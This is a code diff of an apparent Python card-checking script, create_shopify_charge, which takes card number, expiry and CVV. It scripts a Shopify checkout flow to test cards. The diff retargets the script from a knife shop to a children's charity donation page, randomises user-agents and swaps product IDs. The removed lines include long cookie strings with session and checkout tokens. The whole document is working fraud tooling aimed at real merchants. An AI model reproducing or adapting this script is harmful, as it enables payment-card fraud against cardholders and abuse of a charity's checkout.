@@ -19,41 +19,42 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
               user = f"Mozilla/5.0 (Windows NT {random.randint(11, 99)}.0; Win64; x64) AppleWebKit/{random.randint(111, 999)}.{random.randint(11, 99)} (KHTML, like Gecko) Chrome/{random.randint(11, 99)}.0.{random.randint(1111, 9999)}.{random.randint(111, 999)} Safari/{random.randint(111, 999)}.{random.randint(11, 99)}"
               print("FBI FBI")
               headers = {
-                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept': 'application/javascript',
                 'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://shedknives.com',
+                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryGs2Dxh36uAAoJnHA',
+                'origin': 'https://coatesforkids.org',
                 'priority': 'u=1, i',
-                'referer': 'https://shedknives.com/products/2024-sk-decal',
+                'referer': 'https://coatesforkids.org/products/donation',
                 'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+                'user-agent': user,
                 'x-requested-with': 'XMLHttpRequest',
-                # 'cookie': 'secure_customer_sig=; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ=%7B%22token%22%3A%22AAEB4KXOE6KZvnqLN9zGF7Zf3IbIoIo_UKumZI9fqVtHC2oOAL2G5ayUXIX2sFbiZq5YYB73Fyrc5xAKUT5-GerwGBQMw2-928wHTVTZcRlVzM0qBZTKEQlKXgw6_7fVEOosoqm9AAiOxklztiRDB6gTZldEPa9Gq3CvEdji_38gDbDoJFCc4MgCuzTLI51_64KmfE24vKuHCoG5yslgsNQpDWxMuJtBgvvsbuwQbdvnost_Ufr4MrWUCm8OBLP2nl4W_w%22%2C%22locale%22%3A%22en-IN%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222025-05-21T06%3A29%3A28.068Z%22%7D%5D%7D; skip_shop_pay=false; omnisendContactID=682d72f05cbef8fabb3a2746; hide_shopify_pay_for_checkout=false; _shopify_essential=:AZbxiF2iAAEAcZuzlsrzA7wxIjBp12CT5Ul_SLu48uuqkIMdxhIFUyaG4B5rLRrQt16RBGPukQ0KcuIL3tzHtXdSHlg7A2v5nnYUzy490HeF3e40zqQzNqjWI75D7SY3R2ogWgOsISXqie1MC7yxQ46kDvSipy8q8hy9aaNevw47rcA0pXkfzxrVMgrUAFSYA_MBnh8iSezS-HNNV60LuuyNza6TkWkRqjDLxKUe-ZZimh9HsaE5tJLQQ_ZvfUWizF62lPSzxWtOuuEqHk2Y2l5BNwK5v6QW9xvdx2yHYVccPCWecJuDs0WJRoNEpPoMy2IhqUEOobTddMjdQX7Pm5ADiH-0KP987r_dtaMD8wbqIxzilqC0kxf_4iev5TC2bCf3ClWLSm4lbss:; cart_currency=USD; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521170913-HGmge6ThNLITW3MaXa5QPZs0W1Y6kDa4o2E5dcWNZSEPMQEhg; omnisendSessionID=Ych5h10AS0z7MM-20250521170913; omnisendShopifyCart={"41696773669034":1}; localization=US; _shopify_s=33B68418-e829-4984-95ee-7537f5883f33; _shopify_sa_t=2025-05-21T17%3A09%3A37.206Z; page-views=3; _ga_SY9JTQL740=GS2.1.s1747847354$o2$g1$t1747847378$j0$l0$h0; _ga_7XGDR94Y27=GS2.1.s1747847353$o2$g1$t1747847387$j0$l0$h0; keep_alive=eyJ2IjoxLCJ0cyI6MTc0Nzg0NzQwMzAxNywiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjo3MiwiY2EiOjAsImthIjowLCJzYSI6MywidCI6MjUsIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxLCJzIjoxNzQ3ODQ3Mzc3Mjk5LCJkIjoyNX19',
             }
 
-              data = {
-                'form_type': 'product',
-                'utf8': '✓',
-                'id': '46284440141994',
-                'quantity': '1',
-                'product-id': '8028760768682',
-                'section-id': 'template--16314355777706__main',
+              files = {
+                'quantity': (None, '1'),
+                'form_type': (None, 'product'),
+                'utf8': (None, '✓'),
+                'id': (None, '50725104419129'),
+                'product-id': (None, '9864576467257'),
+                'section-id': (None, 'template--24129569751353__main'),
+                'sections': (None, 'cart-notification-product,cart-notification-button,cart-icon-bubble'),
+                'sections_url': (None, '/products/donation'),
             }
 
-              response = requests.post('https://shedknives.com/cart/add.js', headers=headers, data=data)
-              
-              request = await session.post('https://shedknives.com/cart/add.js', headers=headers, data=data)
+              response = requests.post('https://coatesforkids.org/cart/add', headers=headers, files=files)
+
+              request = await session.post('https://coatesforkids.org/cart/add', headers=headers, files=files)
 
               headers = {
                   'accept': 'application/json, text/javascript, */*; q=0.01',
                   'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                   'priority': 'u=1, i',
-                  'referer': 'https://shedknives.com/products/shed-knives-sticker-1',
+                  'referer': 'https://coatesforkids.org/products/donation?variant=9864576467257',
                   'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                   'sec-ch-ua-mobile': '?0',
                   'sec-ch-ua-platform': '"Windows"',
@@ -64,7 +65,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                   'x-requested-with': 'XMLHttpRequest',
               }
 
-              request = await session.get('https://shedknives.com/cart.js', headers=headers)
+              request = await session.get('https://coatesforkids.org/cart', headers=headers)
               token = request.json()["token"]
               print(token)
 
@@ -73,9 +74,9 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                   'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                   'cache-control': 'max-age=0',
                   'content-type': 'application/x-www-form-urlencoded',
-                  'origin': 'https://shedknives.com',
+                  'origin': 'https://coatesforkids.org',
                   'priority': 'u=0, i',
-                  'referer': 'https://shedknives.com/cart',
+                  'referer': 'https://coatesforkids.org/products/donation',
                   'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                   'sec-ch-ua-mobile': '?0',
                   'sec-ch-ua-platform': '"Windows"',
@@ -85,18 +86,13 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                   'sec-fetch-user': '?1',
                   'upgrade-insecure-requests': '1',
                   'user-agent': user,
-                  # 'cookie': 'secure_customer_sig=; localization=IN; cart_currency=INR; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521062556-nK9cqF0t47q3ylxncY5L4i9uAeMaEFuNOhVVbrCSxwXSCmueD; omnisendSessionID=GFstRSazqCxHv9-20250521062556; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; omnisendShopifyCart={"41696773669034":1}; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; _shopify_s=3F85DFA6-fefc-4B56-bc4d-a0a6cb13e275; _shopify_sa_t=2025-05-21T06%3A27%3A53.784Z; _ga_7XGDR94Y27=GS2.1.s1747808756$o1$g1$t1747808874$j0$l0$h0; _ga_SY9JTQL740=GS2.1.s1747808756$o1$g1$t1747808874$j0$l0$h0; page-views=9; keep_alive=eyJ2IjoxLCJ0cyI6MTc0NzgwODk2NDMzNiwiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjoxMSwiY2EiOjAsImthIjowLCJzYSI6MCwidCI6ODksIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxMCwicyI6MTc0NzgwODc1NjMyMiwiZCI6MTk2fX0%3D',
               }
 
               data = {
                   'checkout': '',
-                  'updates[]': '1',
-                  'address[country]': 'United States',
-                  'address[province]': 'Alabama',
-                  'address[zip]': '',
               }
 
-              request = await session.post('https://shedknives.com/cart', follow_redirects=True, headers=headers, data=data)
+              request = await session.post('https://coatesforkids.org/cart', follow_redirects=True, headers=headers, data=data)
               print(request)
               x_checkout_one_session_token = find_between(request.text, 'serialized-session-token" content="&quot;', '&quot;"')
               queue_token                  = find_between(request.text, 'queueToken&quot;:&quot;', '&quot;')
@@ -259,8 +255,8 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                     'stableId': stable_id,
                     'merchandise': {
                         'productVariantReference': {
-                            'id': 'gid://shopify/ProductVariantMerchandise/41696773669034',
-                            'variantId': 'gid://shopify/ProductVariant/41696773669034',
+                            'id': 'gid://shopify/ProductVariantMerchandise/50725104419129',
+                            'variantId': 'gid://shopify/ProductVariant/50725104419129',
                             'properties': [],
                             'sellingPlanId': None,
                             'sellingPlanDigest': None,
@@ -485,8 +481,8 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                         'stableId': stable_id,
                         'merchandise': {
                             'productVariantReference': {
-                                'id': 'gid://shopify/ProductVariantMerchandise/41696773669034',
-                                'variantId': 'gid://shopify/ProductVariant/41696773669034',
+                                'id': 'gid://shopify/ProductVariantMerchandise/50725104419129',
+                                'variantId': 'gid://shopify/ProductVariant/50725104419129',
                                 'properties': [],
                                 'sellingPlanId': None,
                                 'sellingPlanDigest': None,
